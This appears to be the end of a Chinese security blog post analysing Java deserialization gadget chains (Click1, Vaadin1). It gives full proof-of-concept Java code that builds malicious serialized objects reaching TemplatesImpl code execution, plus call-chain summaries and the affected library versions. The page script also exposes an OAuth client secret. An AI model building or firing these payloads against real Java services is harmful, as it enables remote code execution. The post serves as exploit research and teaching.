+<figure data-type="image" tabindex="27"><img src="https://su18.org/post-images/1628644229320.png" alt="" loading="lazy"></figure>
+<p>比较时会调用 <code>this.column</code>  的 <code>getProperty</code> 方法。</p>
+<figure data-type="image" tabindex="28"><img src="https://su18.org/post-images/1628644322725.png" alt="" loading="lazy"></figure>
+<p>在 row 不是 map 类型的情况下，这个方法会调用到 PropertyUtils 的 <code>getValue</code> 方法获取值。</p>
+<h2 id="攻击构造-5">攻击构造</h2>
+<p>有了上面两个类，就可以构造出从 PriorityQueue 到 TemplatesImpl 的利用链了。攻击代码如下：</p>
+<pre><code class="language-java">public class Click {
+
+	public static String fileName = &quot;Click.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+		// 初始化 PriorityQueue
+		PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2);
+		queue.add(&quot;su18&quot;);
+		queue.add(&quot;su19&quot;);
+
+		// 反射将 TemplatesImpl 放在 PriorityQueue 里
+		Field field = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+		field.setAccessible(true);
+		Object[] objects = (Object[]) field.get(queue);
+		objects[0] = tmpl;
+
+		Class&lt;?&gt;       c           = Class.forName(&quot;org.apache.click.control.Column$ColumnComparator&quot;);
+		Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(Column.class);
+		constructor.setAccessible(true);
+
+		Column column = new Column(&quot;outputProperties&quot;);
+		// 为了避免反序列化比较时的空指针，为 column 设置一个 Table 属性
+		column.setTable(new Table());
+		Comparator&lt;?&gt; comparator = (Comparator&lt;?&gt;) constructor.newInstance(column);
+
+		// 反射将 BeanComparator 写入 PriorityQueue 中
+		Field field2 = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+		field2.setAccessible(true);
+		field2.set(queue, comparator);
+
+		SerializeUtil.writeObjectToFile(queue, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<h2 id="总结-5">总结</h2>
+<p>以上就是 Click 链分析的全部内容了，可以看到触发方式与 CB 链极其类似，都是使用 Comparator 触发属性的 getter 方法。最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>PriorityQueue 反序列化触发 Column$ColumnComparator 类的 compare 方法，会调用 PropertyUtils 的 getValue 方法获取属性值，使用了的是反射调用 getter 方法，触发 TemplatesImpl 利用链。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties()</code></li>
+<li>chain gadget：<code>org.apache.click.control.Column$ColumnComparator#compare()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>PriorityQueue.readObject()
+    Column$ColumnComparator.compare()
+        Column.getProperty()
+            PropertyUtils.getValue()
+                PropertyUtils.getObjectPropertyValue()
+                    TemplatesImpl.getOutputProperties()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>click-nodeps : 2.3.0</p>
+</blockquote>
+<h1 id="vaadin1">Vaadin1</h1>
+<p>Vaadin 是一个在Java后端快速开发web应用程序的平台。用 Java 或 TypeScript 构建可伸缩的 UI，并使用集成的工具、组件和设计系统来更快地迭代、更好地设计和简化开发过程。</p>
+<p>又是一个没有听说过的平台框架。Vaadin 的反序列化调用链同样十分简单，依旧是使用反射调用 getter 方法的类来触发 TemplatesImpl 利用链，接下来看一下具体的调用点。</p>
+<h2 id="前置知识-6">前置知识</h2>
+<h3 id="nestedmethodproperty">NestedMethodProperty</h3>
+<p><code>com.vaadin.data.util.NestedMethodProperty</code> 类是一个封装访问属性方法的类。构造方法接收两个参数，一个是对象实例，一个是属性值。初始化时将调用 initialize 方法获取实例类中的相关信息存放在成员变量中。</p>
+<figure data-type="image" tabindex="29"><img src="https://su18.org/post-images/1628664696166.png" alt="" loading="lazy"></figure>
+<p>等到调用 NestedMethodProperty 的 <code>getValue</code> 方法时，就会反射调用封装对象指定属性的 getter 方法。</p>
+<figure data-type="image" tabindex="30"><img src="https://su18.org/post-images/1628667144722.png" alt="" loading="lazy"></figure>
+<p>因此这个类又是可以触发 TemplatesImpl 的利用方式。</p>
+<h3 id="propertysetitem">PropertysetItem</h3>
+<p>触发类是 <code>com.vaadin.data.util.PropertysetItem</code> ，这个类用来存储 Property 属性值，为其映射一个 id 对象。</p>
+<p>数据存放在成员变量 map 中，想要获取相应属性时，则调用 <code>getItemProperty</code> 方法在 map 中获取。</p>
+<figure data-type="image" tabindex="31"><img src="https://su18.org/post-images/1628669790198.png" alt="" loading="lazy"></figure>
+<p>映射的 id 对象则储存在成员变量 list 中。</p>
+<figure data-type="image" tabindex="32"><img src="https://su18.org/post-images/1628669924846.png" alt="" loading="lazy"></figure>
+<p>PropertysetItem 的 toString 方法，获取全部 id 对象并遍历，使用 getItemProperty 方法获取映射的 Property 属性对象，并调用其 getValue 方法。</p>
+<figure data-type="image" tabindex="33"><img src="https://su18.org/post-images/1628669834573.png" alt="" loading="lazy"></figure>
+<p>因此可以使用 PropertysetItem 的 toString 方法触发 NestedMethodProperty 的 getValue 方法。完成漏洞链的构造。</p>
+<h2 id="攻击构造-6">攻击构造</h2>
+<p>代码：</p>
+<pre><code class="language-java">public class Vaadin {
+
+	public static void main(String[] args) throws Exception {
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+		PropertysetItem pItem = new PropertysetItem();
+
+		NestedMethodProperty&lt;Object&gt; nmprop = new NestedMethodProperty&lt;Object&gt;(tmpl, &quot;outputProperties&quot;);
+		pItem.addItemProperty(&quot;outputProperties&quot;, nmprop);
+
+		// 实例化 BadAttributeValueExpException 并反射写入
+		BadAttributeValueExpException exception = new BadAttributeValueExpException(&quot;su18&quot;);
+		Field                         field     = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);
+		field.setAccessible(true);
+		field.set(exception, pItem);
+
+		SerializeUtil.writeObjectToFile(exception);
+		SerializeUtil.readFileObject();
+	}
+}
+</code></pre>
+<h2 id="总结-6">总结</h2>
+<p>以上就是 Vaadin 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>反序列化 BadAttributeValueExpException 触发 PropertysetItem 的 toString 方法 调用到 NestedMethodProperty 的 getValue 方法。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>javax.management.BadAttributeValueExpException#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties()</code></li>
+<li>chain gadget：<code>com.vaadin.data.util.NestedMethodProperty#getValue()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>BadAttributeValueExpException.readObject()
+    PropertysetItem.toString()
+            PropertysetItem.getPropertyId()
+                NestedMethodProperty.getValue()
+                    TemplatesImpl.getObjectPropertyValue()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>vaadin-server : 7.7.14<br>
+vaadin-shared : 7.7.14</p>
+</blockquote>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#rome">ROME</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#objectbean">ObjectBean</a></li>
+<li><a href="#tostringbean">ToStringBean</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+<li><a href="#beanshell">BeanShell</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2">前置知识</a>
+<ul>
+<li><a href="#interpreter">Interpreter</a></li>
+<li><a href="#xthis">XThis</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-2">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-2">总结</a></li>
+</ul>
+</li>
+<li><a href="#c3p0">C3P0</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-3">前置知识</a>
+<ul>
+<li><a href="#poolbackeddatasourcebase">PoolBackedDataSourceBase</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-3">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-3">总结</a></li>
+</ul>
+</li>
+<li><a href="#clojure">Clojure</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-4">前置知识</a>
+<ul>
+<li><a href="#clojurejavashellsh">clojure.java.shell.sh</a></li>
+<li><a href="#compilereval">Compiler.eval</a></li>
+<li><a href="#maineval_opt">main$eval_opt</a></li>
+<li><a href="#abstracttablemodelff19274a">AbstractTableModel$ff19274a</a></li>
+<li><a href="#corecompfn__4727">core$comp$fn__4727</a></li>
+<li><a href="#coreconstantlyfn__4614">core$constantly$fn__4614</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-4">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-4">总结</a></li>
+</ul>
+</li>
+<li><a href="#click1">Click1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-5">前置知识</a>
+<ul>
+<li><a href="#propertyutils">PropertyUtils</a></li>
+<li><a href="#columncomparator">ColumnComparator</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-5">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-5">总结</a></li>
+</ul>
+</li>
+<li><a href="#vaadin1">Vaadin1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-6">前置知识</a>
+<ul>
+<li><a href="#nestedmethodproperty">NestedMethodProperty</a></li>
+<li><a href="#propertysetitem">PropertysetItem</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-6">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-6">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
